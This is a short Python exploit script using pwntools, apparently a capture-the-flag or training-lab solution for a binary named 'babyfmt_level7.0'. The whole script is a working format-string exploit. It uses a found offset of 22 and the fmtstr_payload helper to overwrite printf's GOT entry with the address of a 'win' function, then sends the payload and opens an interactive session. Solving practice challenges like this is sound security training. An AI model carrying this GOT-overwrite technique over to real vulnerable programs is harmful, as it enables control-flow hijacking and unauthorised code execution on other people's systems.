from pwn import *

context(arch="amd64", os="linux", log_level="info")

BINARY = "./babyfmt_level7.0"
io = process(BINARY)
elf = ELF("./babyfmt_level7.0")

printf_got_addr = elf.got["printf"]
win_addr = elf.symbols["win"]

# payload = b"A" * 8 + b".%p" * 22 # offset = 22
payload = fmtstr_payload(22, {printf_got_addr: win_addr})
print(len(payload))
io.recvuntil(b"vulnerability:")
io.send(payload)
io.interactive()
